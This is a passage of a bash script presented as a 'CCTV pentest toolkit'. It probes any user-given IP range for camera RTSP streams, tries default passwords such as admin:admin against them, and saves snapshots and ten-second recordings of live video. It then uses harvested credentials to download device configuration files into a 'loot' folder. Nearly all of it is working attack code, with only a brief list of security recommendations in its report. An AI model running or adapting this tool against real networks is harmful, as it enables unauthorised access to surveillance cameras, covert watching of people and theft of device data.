            echo "$host:$port:$creds" >> "$OUTPUT_DIR/credentials/found_credentials.txt"
        fi
    done
}

# RTSP Stream Hunter with Animations
rtsp_stream_hunter() {
    echo -e "${CYAN}[PHASE 4] RTSP STREAM HUNTER${NC}"
    
    if [ ! -s "$OUTPUT_DIR/recon/live_hosts.txt" ]; then
        echo -e "${RED}[ERROR] No live hosts found. Run discovery first.${NC}"
        return
    fi
    
    # Show CCTV camera animation
    cctv_camera_sweep
    
    echo -e "${YELLOW}[RTSP] Hunting for RTSP streams...${NC}"
    
    # Create streams file
    touch "$OUTPUT_DIR/streams/accessible_streams.txt"
    
    # Parallel RTSP discovery
    if command -v parallel &> /dev/null; then
        cat "$OUTPUT_DIR/recon/live_hosts.txt" | parallel -j $PARALLEL_SCANS "
        host={}
        
        # Check RTSP ports
        for rtsp_port in \$(echo $RTSP_PORTS | tr ',' ' '); do
            if nc -z -w 1 \"\$host\" \"\$rtsp_port\" &> /dev/null; then
                echo \"\$host:\$rtsp_port\" >> \"$OUTPUT_DIR/recon/rtsp_hosts.txt\"
                
                # Try RTSP paths
                while read -r rtsp_path; do
                    rtsp_url=\"rtsp://\$host:\$rtsp_port\$rtsp_path\"
                    
                    # Check without auth
                    if timeout 5 ffprobe -loglevel error \"\$rtsp_url\" &> /dev/null; then
                        echo \"\$rtsp_url\" >> \"$OUTPUT_DIR/streams/accessible_streams.txt\"
                        capture_rtsp_snapshot_fast \"\$rtsp_url\" \"\$host\"
                    else
                        # Try with common credentials
                        for cred in \"admin:admin\" \"admin:1234\" \"admin:12345\" \"admin:123456\" \":\"; do
                            auth_rtsp_url=\"rtsp://\$cred@\$host:\$rtsp_port\$rtsp_path\"
                            if timeout 5 ffprobe -loglevel error \"\$auth_rtsp_url\" &> /dev/null; then
                                echo \"\$auth_rtsp_url\" >> \"$OUTPUT_DIR/streams/accessible_streams.txt\"
                                capture_rtsp_snapshot_fast \"\$auth_rtsp_url\" \"\$host\"
                                break
                            fi
                        done
                    fi
                done < \"$OUTPUT_DIR/rtsp_urls.txt\"
            fi
        done
        " &
        local rtsp_pid=$!
        progress_spinner "RTSP Stream Discovery"
        wait $rtsp_pid
    else
        echo -e "${YELLOW}[INFO] Parallel not available, running sequential discovery...${NC}"
        while IFS= read -r host; do
            for rtsp_port in $(echo $RTSP_PORTS | tr ',' ' '); do
                if nc -z -w 1 "$host" "$rtsp_port" &> /dev/null; then
                    echo "$host:$rtsp_port" >> "$OUTPUT_DIR/recon/rtsp_hosts.txt"
                    
                    while IFS= read -r rtsp_path; do
                        rtsp_url="rtsp://$host:$rtsp_port$rtsp_path"
                        if timeout 5 ffprobe -loglevel error "$rtsp_url" &> /dev/null; then
                            echo "$rtsp_url" >> "$OUTPUT_DIR/streams/accessible_streams.txt"
                            capture_rtsp_snapshot_fast "$rtsp_url" "$host"
                        fi
                    done < "$OUTPUT_DIR/rtsp_urls.txt"
                fi
            done
        done < "$OUTPUT_DIR/recon/live_hosts.txt"
    fi
    
    local stream_count=0
    if [ -f "$OUTPUT_DIR/streams/accessible_streams.txt" ]; then
        stream_count=$(wc -l < "$OUTPUT_DIR/streams/accessible_streams.txt")
    fi
    
    if [ "$stream_count" -gt 0 ]; then
        echo -e "${GREEN}[SUCCESS] Found $stream_count accessible RTSP streams${NC}"
        explosion_effect
    else
        echo -e "${RED}[WARNING] No accessible RTSP streams found${NC}"
    fi
}

# Fast RTSP snapshot capture
capture_rtsp_snapshot_fast() {
    local rtsp_url=$1
    local host=$2
    
    local snapshot_file="$OUTPUT_DIR/streams/snapshot_${host}_$(date +%s).jpg"
    
    if command -v ffmpeg &> /dev/null; then
        timeout 10 ffmpeg -loglevel quiet -i "$rtsp_url" -vframes 1 -q:v 2 "$snapshot_file" &> /dev/null &
        local snapshot_pid=$!
        wait $snapshot_pid
        
        if [ -f "$snapshot_file" ] && [ -s "$snapshot_file" ]; then
            echo -e "${GREEN}[SNAPSHOT] Captured: $snapshot_file${NC}"
        else
            rm -f "$snapshot_file" 2>/dev/null
        fi
    fi
}

# Live Stream Capture with Animations
live_stream_capture() {
    echo -e "${CYAN}[PHASE 5] LIVE STREAM CAPTURE${NC}"
    
    if [ ! -f "$OUTPUT_DIR/streams/accessible_streams.txt" ] || [ ! -s "$OUTPUT_DIR/streams/accessible_streams.txt" ]; then
        echo -e "${RED}[ERROR] No accessible streams found. Run RTSP hunter first.${NC}"
        return
    fi
    
    echo -e "${YELLOW}[CAPTURE] Starting live stream capture...${NC}"
    
    # Show recording animation
    typewriter_effect "🎥 LIVE STREAM RECORDING ACTIVATED" "$BOLD_RED"
    
    local capture_duration=10  # Reduced from 30 to prevent long waits
    
    # Capture from first 2 streams to avoid overload
    head -2 "$OUTPUT_DIR/streams/accessible_streams.txt" | while read -r stream_url; do
        echo -e "${BLUE}[RECORDING] $stream_url${NC}"
        
        local filename
        filename=$(echo "$stream_url" | sed 's/[^a-zA-Z0-9]/_/g')
        local output_file="$OUTPUT_DIR/streams/capture_${filename}_$(date +%s).mp4"
        
        if command -v ffmpeg &> /dev/null; then
            # Capture video with timeout
            timeout $((capture_duration + 5)) ffmpeg -loglevel quiet -i "$stream_url" -t $capture_duration -c copy "$output_file" &
            local capture_pid=$!
            
            # Show progress for this stream
            progress_bar $capture_duration &
            local progress_pid=$!
            
            wait $capture_pid
            kill $progress_pid 2>/dev/null
            
            if [ -f "$output_file" ] && [ -s "$output_file" ]; then
                echo -e "${GREEN}[SUCCESS] Saved: $output_file${NC}"
            else
                rm -f "$output_file" 2>/dev/null
                echo -e "${RED}[FAILED] Could not capture: $stream_url${NC}"
            fi
        else
            echo -e "${RED}[ERROR] ffmpeg not available for stream capture${NC}"
        fi
    done
    
    security_shield
}

# Configuration Extraction with Animations
configuration_extraction() {
    echo -e "${CYAN}[PHASE 6] CONFIGURATION EXTRACTION${NC}"
    
    if [ ! -f "$OUTPUT_DIR/credentials/found_credentials.txt" ] || [ ! -s "$OUTPUT_DIR/credentials/found_credentials.txt" ]; then
        echo -e "${RED}[ERROR] No credentials found. Run credential attack first.${NC}"
        return
    fi
    
    # Show hacking animation
    hacking_terminal_simulation
    
    echo -e "${YELLOW}[CONFIG] Extracting configurations...${NC}"
    
    while IFS= read -r cred_line; do
        local host=$(echo "$cred_line" | cut -d: -f1)
        local port=$(echo "$cred_line" | cut -d: -f2)
        local user=$(echo "$cred_line" | cut -d: -f3)
        local pass=$(echo "$cred_line" | cut -d: -f4)
        
        echo -e "${BLUE}[EXTRACTING] $host:$port${NC}"
        
        extract_configurations "$host" "$port" "$user" "$pass" &
    done < "$OUTPUT_DIR/credentials/found_credentials.txt"
    
    progress_spinner "Configuration Extraction"
    wait
    
    echo -e "${GREEN}[SUCCESS] Configuration extraction completed${NC}"
}

# Extract configurations
extract_configurations() {
    local host=$1
    local port=$2
    local user=$3
    local pass=$4
    
    local auth
    auth=$(echo -n "$user:$pass" | base64)
    
    # Common configuration paths
    local config_urls=(
        "/System/configurationFile"
        "/config/config.json"
        "/cgi-bin/config"
        "/backup/config.bak"
        "/db/configuration.db"
        "/system.ini"
        "/config.ini"
        "/setup.ini"
    )
    
    for config_url in "${config_urls[@]}"; do
        if curl -s -H "Authorization: Basic $auth" "http://$host:$port$config_url" -o "/tmp/config_temp" &> /dev/null; then
            if [ -s "/tmp/config_temp" ]; then
                local safe_name
                safe_name=$(echo "$config_url" | sed 's|/|_|g')
                mv "/tmp/config_temp" "$OUTPUT_DIR/loot/config_${host}_${safe_name}" 2>/dev/null
                echo -e "${GREEN}[CONFIG] Downloaded: $config_url from $host${NC}"
            fi
        fi
    done
}

# Full Automated Assessment with All Animations
full_automated_assessment() {
    echo -e "${CYAN}[MODE] FULL AUTOMATED CCTV ASSESSMENT${NC}"
    
    # Show introduction and banner
    athex_introduction
    ultimate_cctv_banner
    
    get_target
    
    typewriter_effect "🚀 STARTING COMPREHENSIVE CCTV SECURITY ASSESSMENT" "$BOLD_CYAN"
    
    # Run all phases automatically with animations
    ultra_fast_discovery
    advanced_vulnerability_scanner
    mass_credential_attack
    rtsp_stream_hunter
    live_stream_capture
    configuration_extraction
    generate_professional_report
    
    # Final completion animation
    echo -e "${GREEN}[COMPLETE] Full automated assessment finished!${NC}"
    security_shield
    typewriter_effect "🎯 MISSION ACCOMPLISHED - CCTV ASSESSMENT COMPLETE" "$BOLD_GREEN"
}

# Custom Target Scan
custom_target_scan() {
    echo -e "${CYAN}[MODE] CUSTOM TARGET SCAN${NC}"
    
    read -p "Enter target (IP/CIDR/hostname): " custom_target
    if [ -z "$custom_target" ]; then
        echo -e "${RED}[ERROR] Target is required${NC}"
        return
    fi
    
    TARGET="$custom_target"
    full_automated_assessment
}

# Generate Professional Report
generate_professional_report() {
    echo -e "${CYAN}[REPORT] GENERATING PROFESSIONAL REPORT${NC}"
    
    typewriter_effect "📊 GENERATING COMPREHENSIVE SECURITY REPORT" "$BOLD_BLUE"
    
    local report_file="$OUTPUT_DIR/reports/cctv_pentest_report_$(date +%Y%m%d_%H%M%S).html"
    
    # Create comprehensive HTML report
    create_html_report > "$report_file"
    
    echo -e "${GREEN}[SUCCESS] Professional report generated: $report_file${NC}"
    echo -e "${YELLOW}[INFO] Opening report in browser...${NC}"
    
    # Try to open in browser
    if command -v xdg-open &> /dev/null; then
        xdg-open "$report_file" &> /dev/null &
    fi
}

# Create HTML Report
create_html_report() {
    local host_count=0
    local cred_count=0
    local stream_count=0
    
    if [ -f "$OUTPUT_DIR/recon/live_hosts.txt" ]; then
        host_count=$(wc -l < "$OUTPUT_DIR/recon/live_hosts.txt" 2>/dev/null || echo 0)
    fi
    
    if [ -f "$OUTPUT_DIR/credentials/found_credentials.txt" ]; then
        cred_count=$(wc -l < "$OUTPUT_DIR/credentials/found_credentials.txt" 2>/dev/null || echo 0)
    fi
    
    if [ -f "$OUTPUT_DIR/streams/accessible_streams.txt" ]; then
        stream_count=$(wc -l < "$OUTPUT_DIR/streams/accessible_streams.txt" 2>/dev/null || echo 0)
    fi
    
    cat << EOF
<!DOCTYPE html>
<html>
<head>
    <title>CCTV Penetration Test Report - By Athex</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 40px; background: #1a1a1a; color: #fff; }
        .header { background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; padding: 30px; border-radius: 10px; text-align: center; }
        .section { margin: 25px 0; padding: 20px; border-left: 5px solid #667eea; background: #2d2d2d; border-radius: 5px; }
        .vulnerability { color: #ff6b6b; font-weight: bold; padding: 5px; background: #3a2d2d; border-radius: 3px; }
        .success { color: #51cf66; }
        .warning { color: #fcc419; }
        .credential { background: #2d3a2d; padding: 10px; margin: 5px 0; border-radius: 3px; border-left: 3px solid #51cf66; }
        .stream { background: #2d2d3a; padding: 10px; margin: 5px 0; border-radius: 3px; border-left: 3px solid #5c7cfa; }
        .stat { font-size: 1.2em; font-weight: bold; color: #74c0fc; }
    </style>
</head>
<body>
    <div class="header">
        <h1>📹 CCTV Penetration Test Report</h1>
        <p>Generated by ATHEX BL4CK H4T - Pakistani Security Researcher</p>
        <p>Generated: $(date)</p>
        <p>Target: $TARGET</p>
    </div>
    
    <div class="section">
        <h2>📊 Executive Summary</h2>
        <p>Comprehensive security assessment of CCTV surveillance systems conducted by Athex Security Framework.</p>
        <div class="stat">
            Systems Found: $host_count | Credentials: $cred_count | Streams: $stream_count
        </div>
    </div>
    
    <div class="section">
        <h2>🔍 Discovered Systems</h2>
EOF

    if [ -f "$OUTPUT_DIR/recon/live_hosts.txt" ]; then
        while IFS= read -r host; do
            echo "<p>• $host</p>"
        done < "$OUTPUT_DIR/recon/live_hosts.txt"
    fi

    cat << EOF
    </div>
    
    <div class="section">
        <h2>🔑 Found Credentials</h2>
EOF

    if [ -f "$OUTPUT_DIR/credentials/found_credentials.txt" ]; then
        while IFS= read -r cred; do
            echo "<div class='credential'>$cred</div>"
        done < "$OUTPUT_DIR/credentials/found_credentials.txt"
    fi

    cat << EOF
    </div>
    
    <div class="section">
        <h2>📺 Accessible Streams</h2>
EOF

    if [ -f "$OUTPUT_DIR/streams/accessible_streams.txt" ]; then
        head -10 "$OUTPUT_DIR/streams/accessible_streams.txt" | while read -r stream; do
            echo "<div class='stream'>$stream</div>"
        done
    fi

    cat << EOF
    </div>
    
    <div class="section">
        <h2>⚠️ Vulnerabilities Found</h2>
EOF

    if [ -f "$OUTPUT_DIR/exploits/vulnerabilities.txt" ]; then
        while IFS= read -r vuln; do
            echo "<p class='vulnerability'>$vuln</p>"
        done < "$OUTPUT_DIR/exploits/vulnerabilities.txt"
    fi

    cat << EOF
    </div>
    
    <div class="section">
        <h2>💡 Security Recommendations</h2>
        <ul>
            <li>Change all default credentials immediately</li>
            <li>Update firmware to latest versions</li>
            <li>Disable unnecessary services (RTSP, Telnet, UPnP)</li>
            <li>Implement network segmentation</li>
            <li>Use VPN for remote access only</li>
            <li>Enable logging and monitoring</li>
            <li>Regular security audits</li>
            <li>Physical security for cameras</li>
        </ul>
    </div>
</body>
</html>
EOF
}

# Exit script with animation
exit_script() {
    echo -e "${CYAN}[SYSTEM] Shutting down CCTV PenTest Framework...${NC}"
    progress_bar 2
    typewriter_effect "Thank you for using ATHEX CCTV Pentest Toolkit!" "$BOLD_GREEN"
    echo -e "${GREEN}[SUCCESS] Stay secure! - ATHEX BL4CK H4T${NC}"
    exit 0
}

# Get target input
get_target() {
    if [ -z "$TARGET" ]; then
        echo -e "${YELLOW}[TARGET] Enter target IP/CIDR (e.g., 192.168.1.1 or 192.168.1.0/24):${NC}"
        read -r TARGET
        if [ -z "$TARGET" ]; then
            echo -e "${RED}[ERROR] Target is required${NC}"
            exit 1
        fi
    fi
}

# Main execution
main() {
    # Show Athex introduction first
    athex_introduction
    
    # Check dependencies and setup
    check_dependencies
    setup_environment
    
    # Show main menu
    show_main_menu
}

# Enhanced signal handling
trap 'echo -e "\n${RED}[INTERRUPT] Script interrupted by user${NC}"; exit_script' INT TERM

# Start the ultimate toolkit
main "$@"